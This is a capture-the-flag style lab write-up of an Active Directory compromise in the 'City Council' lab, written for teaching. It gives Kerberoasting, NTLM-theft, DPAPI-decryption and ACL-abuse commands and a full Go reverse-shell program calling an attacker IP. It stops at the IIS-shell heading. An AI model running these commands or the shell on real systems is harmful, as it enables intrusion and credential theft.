# City Council | Writeups

[![Logo](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2Fwww.hacksmarter.org%2Fapi%2Ffavicon.ico\&width=20\&dpr=3\&quality=100\&sign=6e985eb0\&sv=2)CourseStackwww.hacksmarter.orgchevron-right](https://www.hacksmarter.org/courses/3a4958cb-8c5b-414c-8efc-eb28b14fd1bc)

The following post by 0xb0b is licensed under [CC BY 4.0![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2Fmirrors.creativecommons.org%2Fpresskit%2Ficons%2Fcc.svg%3Fref%3Dchooser-v1\&width=40\&dpr=3\&quality=100\&sign=7f04aa2e\&sv=2)![](https://0xb0b.gitbook.io/writeups/~gitbook/image?url=https%3A%2F%2Fmirrors.creativecommons.org%2Fpresskit%2Ficons%2Fby.svg%3Fref%3Dchooser-v1\&width=40\&dpr=3\&quality=100\&sign=c8892a07\&sv=2)arrow-up-right](http://creativecommons.org/licenses/by/4.0/?ref=chooser-v1)

***

### [hashtag](city-council-or-writeups.md#scenario) Scenario

#### [hashtag](city-council-or-writeups.md#user-content-objective--scope) Objective / Scope

A local municipality recently survived a devastating ransomware campaign. While their internal IT team believes the infection has been purged and the holes plugged, the Board of Supervisors isn't taking any chances. They’ve brought in **Hack Smarter** to provide a "second pair of eyes."

Your mission is to perform a comprehensive penetration test of the internal infrastructure. Reaching Domain Admin isn't the endgame; treat this like a real engagement. See how many vulnerabilities you're able to identify.

#### [hashtag](city-council-or-writeups.md#user-content-initial-access) Initial Access

You have been provided with VPN access to their internal environment, but no other information.

### [hashtag](city-council-or-writeups.md#summary) Summary

chevron-rightSummary [hashtag](city-council-or-writeups.md#summary-1)

In City Council we assess a municipality's internal Active Directory environment following a recent ransomware incident. With only VPN access and no credentials, we begin by enumerating the exposed services on the domain controller. The host runs a full AD stack (DNS, Kerberos, LDAP/LDAPS, SMB, WinRM, RDP, IIS), confirming we are operating directly against `city.local`.

Web enumeration of the IIS portal reveals staff names and email patterns, which we leverage to generate username candidates. Kerberos username enumeration does not yield results, so we pivot to the downloadable Linux client application referenced on the website. Traffic analysis of the binary during execution exposes plaintext LDAP bind credentials for the service account `svc_services_portal`. Using these credentials, we authenticate to the domain and enumerate Active Directory with BloodHound.

Kerberoasting reveals a crackable TGS for `clerk.john`, granting us `READ`/`WRITE`access to the `Uploads` share. An internal email hints that NTLM authentication is used without prompting for passwords. We weaponize this by planting NTLM coercion files (created via `ntlm_theft`) on the writable share and capture the NTLMv2 hash of `jon.peters`, which we crack offline. BloodHound shows `jon.peters` has `GenericWrite` over multiple users, enabling Targeted Kerberoasting. We obtain and crack service tickets for `nina.soto` and `maria.clerk`.

Access as `nina.soto` grants read access to the `Backups` share, where we discover WIM user profile backups. Extracting them reveals emails and DPAPI-protected Credential Manager blobs. Using Impacket's `dpapi.py` with `clerk.john`'s credentials, we decrypt stored credentials and recover the password for `emma.hayes` from Helpdesk.

BloodHound analysis shows `emma.hayes` has `WriteDacl` and `GenericWrite` over key OUs and users. We grant ourselves `GenericAll` over the `CityOps` OU, reset and enable the `sam.brooks` account a Remote Management Users member, and gain a WinRM foothold. From there, we pivot to the quarantined `web_admin` account by moving it into the `CityOps` OU (leveraging `GenericWrite` over Quarantine and `GenericAll` over CityOps), reset its password, and execute a reverse shell via `RunasCs`.

As `web_admin`, we upload an ASPX web shell to IIS and gain execution as `iis apppool\defaultapppool`. The account holds `SeImpersonatePrivilege`, allowing us to`NT AUTHORITY\SYSTEM` a system shell by compiling and executing an EfsPotato exploit. This yields completing full domain controller compromise. We retrieve the final flag from the Administrator profile.

### [hashtag](city-council-or-writeups.md#recon) Recon

We use `rustscan -b 500 -a 10.1.90.188 -- -sC -sV -Pn` to enumerate all TCP ports on the target machine, piping the discovered results into Nmap which runs default NSE scripts `-sC`, service and version detection `-sV`, and treats the host as online without ICMP echo `-Pn`.

A batch size of `500` trades speed for stability, the default `1500` balances both, while much larger sizes increase throughput but risk missed responses and instability.

Copy

```
rustscan -b 500 -a 10.1.90.188 --top -- -sC -sV -Pn
```

![](<../../../.gitbook/assets/image (264)>)

The target machine is actually a domain controller with exposed services including DNS `53`, Kerberos `88/464`, an `IIS /10.0` web server on port `80`, multiple MSRPC endpoints `135, 593, 49664+`, SMB `139/445`, LDAP and LDAPS `389/636/3268/3269` tied to Active Directory, RDP `3389`, WinRM on `5985`, and .NET Remoting `9389`. This indicates a fully integrated Windows AD environment where LDAP/LDAPS and Kerberos provide authentication, SMB and RPC enable remote management, and RDP/WinRM serve as remote access points.

![](<../../../.gitbook/assets/image (265)>)

![](<../../../.gitbook/assets/image (266)>)

#### [hashtag](city-council-or-writeups.md#web) WEB

For now, we'll continue and take a look at the website hosted via the IIS.

The site promotes a digital service portal to access various city government services such as permits, licenses, and service requests.

Copy

```
http://10.1.90.188
```

![](<../../../.gitbook/assets/image (267)>)

We browse through the website and discover a team of four people in the lower third. From this information, we can identify the first and last names as well as the email addresses of each individual team member.

![](<../../../.gitbook/assets/image (268)>)

We note down the names for possible later creation of a word list and username enumeration.

users.txt

Copy

```
emma hayes
jon peters
rita cho
nina soto
```

In the footer, we discover further links, including `Documents & Forms`.

![](<../../../.gitbook/assets/image (269)>)

In the footer, we discover further links, including Documents & Forms. Here we can download a Windows or Linux application to access various city government services.

Copy

```
http://10.1.90.188/documents-forms.html
```

![](<../../../.gitbook/assets/image (270)>)

Furthermore, we find instructions on how to use the applications, such as dependencies or entries that must be made in `/etc/hosts`. Here, we can already directly adopt the `/etc/hosts` entry. The entries required correspond to the domain we discovered from the Nmap scan.

![](<../../../.gitbook/assets/image (271)>)

#### [hashtag](city-council-or-writeups.md#smb) SMB

Before we dive in with username enumeration we try to authenticate as `guest` and anonymously against SMB, but without success - the account is disabled. Nevertheless we could generate the hosts file entry like the following:

Copy

```
nxc smb 10.1.90.188 -u guest -p '' --generate-hosts-file hosts
```

![](<../../../.gitbook/assets/image (272)>)

If not already done, we add the following line to our `/etc/host entry`:

Copy

```
10.1.90.188 DC-CC.city.local city.local DC-CC
```

#### [hashtag](city-council-or-writeups.md#ldap) LDAP

Since we have a list of first and last names, no valid usernames yet and no access, we create a username word list from this using username anarchy and use this resulting list to enumerate possible usernames using kerbrute.

[https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap\_ad\_dark\_classic\_2025.03.excalidraw.svgorange-cyberdefense.github.iochevron-right](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)

![](<../../../.gitbook/assets/image (273)>)

We create a username wordlist using Username Anarchy:

[![Logo](<../../../.gitbook/assets/image (274)>)GitHub - urbanadventurer/username-anarchy: Username tools for penetration testingGitHubchevron-right](https://github.com/urbanadventurer/username-anarchy)

Copy

```
username-anarchy -i users.txt > usernames.txt
```

![](<../../../.gitbook/assets/image (275)>)

Next we pass the list to Kerbrute, but we are not able to identify any valid users:

[![Logo](<../../../.gitbook/assets/image (274)>)GitHub - ropnop/kerbrute: A tool to perform Kerberos pre-auth bruteforcingGitHubchevron-right](https://github.com/ropnop/kerbrute)

Copy

```
kerbrute userenum -d city.local --dc DC-DC usernames.txt
```

![](<../../../.gitbook/assets/image (276)>)

#### [hashtag](city-council-or-writeups.md#binaries) Binaries

We continue with the binaries. I decided to take a closer look at the Linux binary. For this part, I had to switch to an amd64 machine. It turns out that the reversing is not so straightforward. And we could find out more by executing the binary, if necessary.

If not already done, we add the following line to our `/etc/host entry`:

Copy

```
10.1.90.188 DC-CC.city.local city.local DC-CC
```

We download the binary and make it executable.

![](<../../../.gitbook/assets/image (277)>)

Next, we run the binary.

![](<../../../.gitbook/assets/image (278)>)

### [hashtag](city-council-or-writeups.md#access-as-svc_services_portal) Access as svc\_services\_portal

We can fill out and submit different forms for inquiries. For testing purposes, we use the `Building Permit Request` form, as it is already neatly pre-filled. We submit an application and see the `Application Status Log` building up.

We see that a connection to the City Council Directory Services is being established. The `svc_services_portal` account is used and authenticated by means of an LDAP bind request. It is possible that credentials are stored in the binary and are transferred during the connection establishment.

![](<../../../.gitbook/assets/image (279)>)

After a short time, we see that our request has been processed.

![](<../../../.gitbook/assets/image (280)>)

We start Wireshark, select `tun0` in our case, and capture the traffic. We send another request.

After a short time, we see the bind request, which contains the user `svc_services_portal` and the corresponding password in a packet.

![](<../../../.gitbook/assets/image (281)>)

If we follow the TCP request, it is easier to read.

![](<../../../.gitbook/assets/image (282)>)

We test the credentials using NetExec on SMB. We successfully authenticated. In addition to the standard shares, we discover the `Uploads` and `Backups` share. However, as this user, we do not have access to these; we cannot access them for reading or writing. As this user, we cannot access the system via RDP or WinRM.

Copy

```
nxc smb city.local -u svc_services_portal -p 'REDACTED'  --shares
```

![](<../../../.gitbook/assets/image (283)>)

### [hashtag](city-council-or-writeups.md#bloodhound-enumeration-i) BloodHound Enumeration I

With the credentials, we can now also enumerate the AD using BloodHound.

Copy

```
bloodhound-ce.py --zip -c All -d city.local -u svc_services_portal -p 'REDACTED' -dc DC-CC.city.local -ns 10.1.90.188
```

![](<../../../.gitbook/assets/image (284)>)

We first look at our compromised user and initially do not find any special permissions or groups. This confirms why we were unable to access the machine via RDP or WinRM. The user is not in any of the required groups.

![](<../../../.gitbook/assets/image (285)>)

We are able to identify `Administrator` as one of the Domain Admins.

![](<../../../.gitbook/assets/image (286)>)

However, we can detect Kerberos-enabled users. This is the user `clerk.john`. With the valid credentials we could have try Kerberoasting also blindly.

We also cannot find any other special groups or permissions from `clerk.john`. Our hope now is that we can extract a TGS blob from `clerk.john` using kerberoasting and then crack it offline. With access as `clerk.john`, we could maybe then gain access to one of the shares and thus extend our privileges if they contained sensitive loot.

![](<../../../.gitbook/assets/image (287)>)

### [hashtag](city-council-or-writeups.md#access-as-clerk.john) Access as clerk.john

We use NetExec for kerberoasting and obtain the TGS blob from `clerk.john`.

[![Logo](<../../../.gitbook/assets/image (288)>)Kerberoast | The Hacker Recipeswww.thehacker.recipeschevron-right](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast#practice)

> When asking the KDC (Key Distribution Center) for a Service Ticket (ST), the requesting user needs to send a valid TGT (Ticket Granting Ticket) and the service name (`sname`) of the service wanted. If the TGT is valid, and if the service exists, the KDC sends the ST to the requesting user.
>
> Multiple formats are accepted for the `sname` field: servicePrincipalName (SPN), sAMAccountName (SAN), userPrincipalName (UPN), etc. (see [Kerberos ticketsarrow-up-right](https://www.thehacker.recipes/ad/movement/kerberos/#tickets) "cname formats").
>
> The ST is encrypted with the requested service account's NT hash. If an attacker has a valid TGT and knows a service (by its SAN or SPN), he can request a ST for this service and crack it offline later in an attempt to retrieve that service account's password.
>
> In most situations, services accounts are machine accounts, which have very complex, long, and random passwords. But if a service account, with a human-defined password, has a SPN set, attackers can request a ST for this service and attempt to crack it offline. **This is Kerberoasting**.

[https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap\_ad\_dark\_classic\_2025.03.excalidraw.svgorange-cyberdefense.github.iochevron-right](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)

![](<../../../.gitbook/assets/image (289)>)

Copy

```
nxc ldap city.local -u svc_services_portal -p 'REDACTED' --kerberoasting output.txt
```

![](<../../../.gitbook/assets/image (290)>)

Next, we try to crack the hash using the wordlist rockyou.txt and are able to retrieve the password of `john.clerk`.

Copy

```
hashcat -a0 -m13100 output.txt /usr/share/wordlists/rockyou.txt
```

![](<../../../.gitbook/assets/image (291)>)

We test the credentials using NetExec on SMB. We successfully authenticated. And we do have actually `READ` and `WRITE` permission to the `Uploads` share.

Copy

```
nxc smb city.local -u clerk.john -p 'REDACTED' --shares
```

![](<../../../.gitbook/assets/image (292)>)

### [hashtag](city-council-or-writeups.md#access-as-jon.peters) Access as jon.peters

We connect to the share using `smbclient.py`. Here we find various documents, we download the entire content via `mget *`.

Copy

```
smbclient.py city.local/clerk.john:'REDACTED'@10.1.90.188
```

![](<../../../.gitbook/assets/image (293)>)

An email is among the files from `Emma Hayes` and `Jon Peters`. Here, the IT help desk provides instructions on how to use and integrate a share, the `Uploads` share, to which we also have `READ` and `WRITE` access. It is noted that NTLM is used for authentication and that a password entry is not necessary. This email seems to be a subtle hint that we, as attackers, should use the write permission to steal NTLM hashes. This is possible if we place a file on the share that references a remote resource under our control. When a user or service accesses this file, the system will automatically attempt to authenticate to the remote SMB share using NTLM, causing the NTLM challenge-response to be sent to our listener. By capturing this authentication attempt with a tool like `Responder`, we can obtain the NTLM hash.

![](<../../../.gitbook/assets/image (294)>)

WriteAccess\_Jon.Peters\_DC-CC-Uploads.eml

Copy

```
Subject: Write access to \DC-CC\Uploads has been granted

From: Emma Hayes emma.hayes@city.local

To: Jon Peters jon.peters@city.local

Date: Fri, 24 Oct 2025 10:42:00 +0100

Hi Jon,

Quick note: I’ve granted you write access to the shared folder \\DC-CC\Uploads. The folder is mapped as drive Z: on your workstation — you should be able to create, edit and upload files there.

The following files are already in the Uploads folder and appear to be actively edited by you:

Staff_Contacts.txt

If the drive does not connect automatically, you can map it manually (you will be prompted for your domain credentials):

net use Z: \\DC-CC\Uploads /user:city.local\jon.peters

Please note: the share uses NTLM authentication. If you connect from an unfamiliar or public device and see an authentication prompt, do not enter your credentials on that device — contact the IT Helpdesk so we can verify the endpoint before you proceed.

If you encounter any issues saving files or the mapping does not persist after reboot, let me know and I’ll check the mapping remotely.

Best regards,
Emma Hayes
IT Helpdesk – City Council
```

chevron-downShow all 31 lines

The Greenwolf `ntlm_theft` tool may help us out here. With that we are able to create up to 21 files that can be used for NTLM hash theft.

[![Logo](<../../../.gitbook/assets/image (274)>)GitHub - Greenwolf/ntlm\_theft: A tool for generating multiple types of NTLMv2 hash theft files by Jacob Wilkin (Greenwolf)GitHubchevron-right](https://github.com/Greenwolf/ntlm_theft)

Alternatively, the hashgrab tool is also very reliable for generating such files, which connect to our server when called up for rendering:

[![Logo](<../../../.gitbook/assets/image (274)>)GitHub - xct/hashgrab: generate payloads that force authentication against an attacker machineGitHubchevron-right](https://github.com/xct/hashgrab)

We generate the files...

Copy

```
ntlm_theft.py --generate modern --server 10.200.37.204 --filename 'note'
```

![](<../../../.gitbook/assets/image (295)>)

... spin up responder...

Copy

```
sudo responder -I tun0
```

![](<../../../.gitbook/assets/image (296)>)

... and connect to the share again using `smbclient.py`. We put the resulting `.lnk` file from `ntlm_theft.py` into the share and wait some time.

Copy

```
smbclient.py city.local/clerk.john:'REDACTED'@10.1.90.188
```

![](<../../../.gitbook/assets/image (297)>)

After a short duration we receive the NTLMv2-SSP of `jon.peters`.

![](<../../../.gitbook/assets/image (298)>)

We try to crack the hash and are successful.

Copy

```
hashcat -a0 -m5600 NTLMv2-SSP-jon.peters /usr/share/wordlists/rockyou.txt
```

![](<../../../.gitbook/assets/image (299)>)

We test the credentials using NetExec on SMB. We successfully authenticated. However, we only have access to the `Uploads` share, which we have already successfully enumerated and exploited. So we need to go back to the drawing board. Let's look at our BloodHound data to see what the user can do.

Copy

```
nxc smb city.local -u jon.peters -p 'REDACTED' --shares
```

![](<../../../.gitbook/assets/image (300)>)

### [hashtag](city-council-or-writeups.md#bloodhound-enumeration-i-1) BloodHound Enumeration I

We see that the user jon.peters has GenericWrite permissions over three users. Those are `paul.roberts`, `maria.clerk` and `nina.soto`. his allows either a TargetedKerberoast or Shadow Credentials Atttack.

![](<../../../.gitbook/assets/image (301)>)

### [hashtag](city-council-or-writeups.md#access-as-nina.soto-and-maria.clark) Access as nina.soto & maria.clark

We will first attempt a TargetedKerberoast attack.

[![Logo](<../../../.gitbook/assets/image (288)>)Targeted Kerberoasting | The Hacker Recipeswww.thehacker.recipeschevron-right](https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting#targeted-kerberoasting)

> This abuse can be carried out when controlling an object that has a `GenericAll`, `GenericWrite`, `WriteProperty` or `Validated-SPN` over the target. A member of the [Account Operatorarrow-up-right](https://www.thehacker.recipes/ad/movement/builtins/security-groups) group usually has those permissions.
>
> The attacker can add an SPN (`ServicePrincipalName`) to that account. Once the account has an SPN, it becomes vulnerable to [Kerberoastingarrow-up-right](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast). This technique is called Targeted Kerberoasting.

[https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap\_ad\_dark\_classic\_2025.03.excalidraw.svgorange-cyberdefense.github.iochevron-right](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)

![](<../../../.gitbook/assets/image (302)>)

[![Logo](<../../../.gitbook/assets/image (274)>)GitHub - ShutdownRepo/targetedKerberoast: Kerberoast with ACL abuse capabilitiesGitHubchevron-right](https://github.com/ShutdownRepo/targetedKerberoast)

We receive the TGS blobs from all four users:

Copy

```
targetedKerberoast.py -d 'city.local' -u 'jon.peters' -p 'REDACTED' --dc-ip 10.1.90.188
```

![](<../../../.gitbook/assets/image (303)>)

And can crack the blobs from `nina.soto` and `maria.clerk`.

Copy

```
hashcat -a0 -m13100 targetdKerberoastHashes.txt /usr/share/wordlists/rockyou.txt
```

![](<../../../.gitbook/assets/image (304)>)

We test the credentials again using NetExec via SMB. We are able to authenticate successfully and see at `nina.soto` that we now have read access to the share `Backups`.

Copy

```
nxc smb city.local -u nina.soto -p 'REDACTED' --shares
```

![](<../../../.gitbook/assets/image (305)>)

### [hashtag](city-council-or-writeups.md#acces-as-emma.hayes) Acces as emma.hayes

We connect to the share using smbclient.py and discover two subfolders: `Documents Backup` and `UserProfileBackups`. We download all contents of both files using `mget *`. The UserProfileBackups share contains two WIM files corresponding to the users `clerk.john` and `sam.brooks`.

Windws Imaging Format files are disk image files used by **Windows** to store a complete Windows installation or system deployment image. They allow multiple system images to be stored in one file.

circle-info

The WIM file from `clerk.john` is somewhat larger and therefore takes a little longer to download successfully. Both files are required.

Copy

```
smbclient.py city.local/nina.soto:'REDACTED'@10.1.90.188
```

![](<../../../.gitbook/assets/image (306)>)

To extract the contents, we use `wimextract` from the `wimtools` suite, which can be easily installed using `apt install wimtools`, for example.

We create a folder for the contents of the image...

Copy

```
mkdir sam_brooks
```

... and extract them into this folder as follows.

Copy

```
wimextract sam.brooks_ProfileBackup_0728.wim 1 --dest-dir=./sam_brooks
```

![](<../../../.gitbook/assets/image (307)>)

We look at the folder structure using `tree`...

![](<../../../.gitbook/assets/image (308)>)

and spot a `message_sam.eml` email file in the users `Desktop`.

![](<../../../.gitbook/assets/image (309)>)

From the email, we can gather that the `web_admin` account was moved to the `Quarantine OU` due to security concerns related to system activity. This was done because the web server allows ASP.NET `.aspx` uploads, which could potentially be abused with that account to escalate privileges or perform unauthorized actions.

That's interesting, we'll keep that information in mind. We may need the `web_admin` account later to exploit this and place an ASPX web/reverse shell to extend our privileges.

Copy

```
cat message_sam.eml
```

![](<../../../.gitbook/assets/image (310)>)

message\_sam.eml

Copy

```
Subject: Notice: web_admin account moved to Quarantine OU

Hi Sam,

This is to inform you that the web_admin account has been moved to the Quarantine OU following security concerns identified during recent system activity.
The web server has ASP.NET enabled and file uploads of .aspx pages are possible; in combination with the web_admin account this creates a scenario could be used to escalate privileges or perform unauthorized actions.

No production impact has been confirmed, but the account has been isolated for forensic review as a precautionary measure.

If you require any temporary access or need updates regarding the investigation, please contact Emma Hayes (Helpdesk) at emma.hayes for coordination and approval.

Regards,
Administrator
IT Operations

(Ref: CHGWEBA
```

chevron-downShow all 16 lines

We continue and extract the contents from `clerk.john_ProfileBackup_0729.wim`. We create a folder and continue in the same way as for `sam_brooks`.

Copy

```
mkdir clerk_john
```

Copy

```
wimextract clerk.john_ProfileBackup_0729.wim 1 --dest-dir=./clerk_john
```

![](<../../../.gitbook/assets/image (311)>)

Here, too, we look at the folder structure and its contents using `tree`.

![](<../../../.gitbook/assets/image (312)>)

And we also found an email here on the desktop

![](<../../../.gitbook/assets/image (313)>)

From the mail we can extract that `Emma Hayes` informs John that he can temporarily use her account while she is on vacation to handle urgent IT tasks, and the credentials will be shared via an approved channel. She instructs him to store them in Windows Credential Manager protected by DPAPI.

Copy

```
cat 2025-10-30-Emma-Hayes_to_Clerk-John_Temporary-Access_DPAPI.eml
```

![](<../../../.gitbook/assets/image (314)>)

2025-10-30-Emma-Hayes\_to\_Clerk-John\_Temporary-Access\_DPAPI.eml

Copy

```
Subject: Temporary access while I’m on vacation

Hi John,

Quick heads-up: while I’m on vacation, you may use my account to handle urgent IT tasks.

Credentials
I’ll share the credentials with you via our approved channel. Please store them in Windows Credential Manager (Control Panel → User Accounts → Credential Manager → Windows Credentials → Add a Windows credential) and use them from there.

DPAPI note (why Credential Manager):
Windows Credential Manager protects saved credentials with DPAPI—they’re encrypted to your user profile (and this machine), so the password isn’t stored in plaintext. Still, treat it as sensitive: accounts with LOCAL SYSTEM / domain admin privileges can technically recover DPAPI-protected secrets, so only use it on trusted machines and profiles, and never export or sync these creds.

When I’m back
On my return, please remove the stored credential from Credential Manager. As discussed, your temporary membership in the “Remote Management” group will be revoked after my vacation.

Security reminders

Use the account only for work-related actions you’d normally escalate to IT.

Don’t save the password anywhere else or forward it.

Log off when finished and avoid keeping interactive sessions open.

Thanks for covering!

Best,
Emma Hayes
Helpdesk / IT Support
emma.hayes@city.local
```

chevron-downShow all 29 lines

![](<../../../.gitbook/assets/image (315)>)

We identify the Credential Manager blob and the corresponding DPAPI masterkey in the user's profile directories of the extracted image.

Credential Manager blob:

Copy

```
AppData/Roaming/Microsoft/Credentials/03128079C6E14F37F5AEBDD69E344291
```

![](<../../../.gitbook/assets/image (316)>)

Master Key file:

Copy

```
AppData/Roaming/Microsoft/Protect/S-1-5-21-407732331-1521580060-1819249925-1103/de222e76-cb5d-418f-a1c2-7e4e9dfe29e1
```

![](<../../../.gitbook/assets/image (317)>)

We extract the masterkey using `dpapi.py masterkey` with John's SID and password.

Copy

```
dpapi.py masterkey -file clerk_john/AppData/Roaming/Microsoft/Protect/S-1-5-21-407732331-1521580060-1819249925-1103/de222e76-cb5d-418f-a1c2-7e4e9dfe29e1 -sid S-1-5-21-407732331-1521580060-1819249925-1103 -password REDACTED
```

![](<../../../.gitbook/assets/image (318)>)

Next, we use that key with `dpapi.py credential` (a tool by impacket) to decrypt the stored credential file and extract the password of `emma.hayes`.

Copy

```
dpapi.py credential -file clerk_john/AppData/Roaming/Microsoft/Credentials/03128079C6E14F37F5AEBDD69E344291 -key REDACTED
```

![](<../../../.gitbook/assets/image (319)>)

We test the credentials using NetExec on SMB. We successfully authenticated.

![](<../../../.gitbook/assets/image (320)>)

circle-info

We could also retrieve the password of emma.hayes from the command line powershell history of clerk.john from

`AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLineConsoleHost_history.txt`

### [hashtag](city-council-or-writeups.md#bloodhound-enumeration-iii) BloodHound Enumeration III

We see that `emma.hayes` is in the helpdesk group.

![](<../../../.gitbook/assets/image (321)>)

Furthermore, the user has `GenericWrite` permissions over the `quarantine` OU and `WriteDacl` permissions over the `citypos` OU. The user also has `GenericWrite` permissions over the `web_admin` user. (Remember, we may need this to compromise the user in the context of the running web application).

In addition to these, this user also has `WriteDacl` permissions for `rita.cho`, `alex.king`, and `sam.brooks`.

* **Quarantine OU (GenericWrite):** Allows us to modify attributes of the OU, such as adding or modifying objects inside it (e.g., moving users or changing settings).
* **citypos OU (WriteDacl):** Allows us to change the OU's permissions (ACL), potentially granting ourselves or others full control over objects within that OU.
* **web\_admin user (GenericWrite):** Allows us to modify the user’s attributes, such as changing the logon script, or adding SPNs for Kerberos abuse.
* **rita.cho, alex.king, sam.brooks (WriteDacl):** Allows us to modify their ACLs, enabling us to grant ourselves rights like **FullControl** or **ResetPassword** over those accounts.

![](<../../../.gitbook/assets/image (322)>)

We see that `rita.cho`, `alex.king`, and `sam.brooks` are part of OU `cityops`.

This means that if we granted ourselves the `GenericAll` permission over the cityops OU via `WriteDacl`, we would also have access to the users inside the OU, granting us `GenericAll` over them. This would allow us to reset their passwords and compromise those accounts..

![](<../../../.gitbook/assets/image (323)>)

As in the previously discovered email from images, we can confirm that `web_admin` is part of quarantine.

![](<../../../.gitbook/assets/image (324)>)

We also discover that `sam.brooks` is part of the `remote management users` group. We can therefore establish our initial foothold through that account.

So, we will primarily link our potential attack vectors to obtain an interactive session through `sam.brooks`.

We will use `WriteDacl` to grant `GenericAll` permissions over the cityops OU and then change `sam.brooks`' password.

![](<../../../.gitbook/assets/image (325)>)

### [hashtag](city-council-or-writeups.md#shell-as-sam.brooks) Shell as sam.brooks

We grant `GenericAll` rights over the `CityOps` OU, giving us full control over the object and its members, which allows actions such as resetting the passwords of users within that OU.

Copy

```
bloodyAD --host DC-CC.city.local -d city.local -u emma.hayes -p 'REDACTED' add genericAll 'OU=CityOps,DC=city,DC=local' 'emma.hayes'
```

![](<../../../.gitbook/assets/image (326)>)

Next, we reset the password of the user `sam.brooks`, which is possible because our `GenericAll` rights over the CityOps OU give us control over its member accounts.

Copy

```
bloodyAD -u emma.hayes -p 'REDACTED' -d 'city.local' --host 10.1.90.188 set password 'sam.brooks' 'Pwned123@!'
```

We test access using NetExec, but the account is disabled, something I have overlooked in the BloodHound data; however, since we have `GenericAll`, we can simply enable the account.

![](<../../../.gitbook/assets/image (327)>)

Copy

```
nxc smb city.local -u sam.brooks -p 'Pwned123@!' --shares
```

![](<../../../.gitbook/assets/image (328)>)

We then enable the `sam.brooks` account by removing the `ACCOUNTDISABLE` flag from the UserAccountControl attribute using bloodyAD.

Copy

```
bloodyAD --host DC-CC.city.local -d city.local -u emma.hayes -p 'REDACTED' remove uac 'sam.brooks' -f ACCOUNTDISABLE
```

![](<../../../.gitbook/assets/image (329)>)

We test again with NetExec and can now successfully authenticate with the enabled account.

Copy

```
nxc smb city.local -u sam.brooks -p 'Pwned123@!' --shares
```

![](<../../../.gitbook/assets/image (330)>)

Next we establish a remote PowerShell session using WinRM with the compromised and find the users flag in the Desktop folder of `sam.brooks`.

Copy

```
evil-winrm -i DC-CC.city.local -u sam.brooks -p 'Pwned123@!'
```

![](<../../../.gitbook/assets/image (331)>)

### [hashtag](city-council-or-writeups.md#shell-as-web_admin) Shell as web\_admin

In our session as `sam.brooks`, we try to write to the `/inetpub/wwwroot` directory but are unsuccessful. We lack the permissions; we cannot place an aspx shell here, for now. So, as expected, we will need the `web_admin` account.

![](<../../../.gitbook/assets/image (332)>)

The hashes obtained through targeted Kerberoasting were not crackable, and the Shadow Credentials attack was also unsuccessful.

Both ways are depicted here in a similar fashion:

[![Logo](<../../../.gitbook/assets/image (333)>)Arasaka | Writeups0xb0b.gitbook.iochevron-right](https://0xb0b.gitbook.io/writeups/hack-smarter-labs/2025/arasaka#access-as-soulkiller.svc)

Instead, we try to leverage our privileges by moving the `web_admin` account into the `CityOps` OU, where we previously granted ourselves `GenericAll`, allowing us to reset the `web_admin` password and take control of the account.

We prepare an LDIF file to move the `web_admin` user object from the `Quarantine` OU to the `CityOps` OU.

Copy

```
cat <<EOF > move.ldif
dn: CN=Web Admin,OU=Quarantine,DC=city,DC=local
changetype: moddn
newrdn: CN=Web Admin
deleteoldrdn: 1
newsuperior: OU=CityOps,DC=city,DC=local
EOF
```

Next, we execute the LDAP modification to move the `web_admin` account from the `Quarantine` OU to the `CityOps` OU, placing it in a location where we have `GenericAll` control.

Copy

```
ldapmodify -H ldap://DC-CC.city.local \
-D 'emma.hayes@city.local' \
-w 'REDACTED' \
-f move.ldif
```

![](<../../../.gitbook/assets/image (334)>)

After moving the account to the `CityOps` OU, we leverage our `GenericAll` privileges over that OU to reset the password of the `web_admin` user, allowing us to take control of the account.

Copy

```
bloodyAD -u emma.hayes -p '!Gemma4James!' -d 'city.local' --host 10.1.90.188 set password 'web_admin' 'Pwned123@!'
```

![](<../../../.gitbook/assets/image (335)>)

Next we verify the new credentials using NetExec, and we can successfully authenticate as `web_admin`.

Copy

```
nxc smb city.local -u web_admin -p 'Pwned123@!' --shares
```

![](<../../../.gitbook/assets/image (336)>)

Unfortunately, the user is not part of the `Windows Remote Management Users` group or the `Remote Desktop Users` group. Therefore, we cannot conveniently establish an interactive session.

![](<../../../.gitbook/assets/image (337)>)

What we can do, however, is start a reverse shell in the context of the user `web_admin` using `RunasCs.exe`.

For a more interactive shell, we use our go reverse shell, which has remained undetected so far.

0xb0b.go

Copy

```
package main

import (
    "net"
    "os/exec"
)

func main() {
    c, _ := net.Dial("tcp", "10.200.37.204:4445")
    cmd := exec.Command("powershell")
    cmd.Stdin = c
    cmd.Stdout = c
    cmd.Stderr = c
    cmd.Run()
}
```

We compile the reverse shell as follows on our Exegol instance:

Copy

```
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -o 0xb0b.exe 0xb0b.go
```

![](<../../../.gitbook/assets/image (338)>)

Next, we run a listener to catch the reverse shell. For this purpose we use Penelope:

[![Logo](<../../../.gitbook/assets/image (274)>)GitHub - brightio/penelope: Penelope Shell HandlerGitHubchevron-right](https://github.com/brightio/penelope)

Copy

```
penelope -p 443
```

The reverse shell binary prepares and RunasCs.exe in the current working folder, we reconnect (if interrupted) using evil-winrm to the target as `emma.hayes`.

We will place the binaries in a global folder accessible to all users. In this case, `C:\Temp`.

We upload the binaries.

Copy

```
upload RunasCs.exe
```

Copy

```
upload 0xb0b.exe
```

Next, we execute our reverse shell binary `0xb0b.exe` in the context of the `web_admin` user:

Copy

```
.\RunasCs.exe web_admin 'Pwned123@!' C:\Temp\0xb0b.exe
```

![](<../../../.gitbook/assets/image (339)>)

We receive a connection...

![](<../../../.gitbook/assets/image (340)>)

... we are `web_admin`.

![](<../../../.gitbook/assets/image (341)>)

### [hashtag](city-council-or-writeups.md#shell-as-iis-apppool-defaultapppool) Shell as iis apppool\defaultapppool

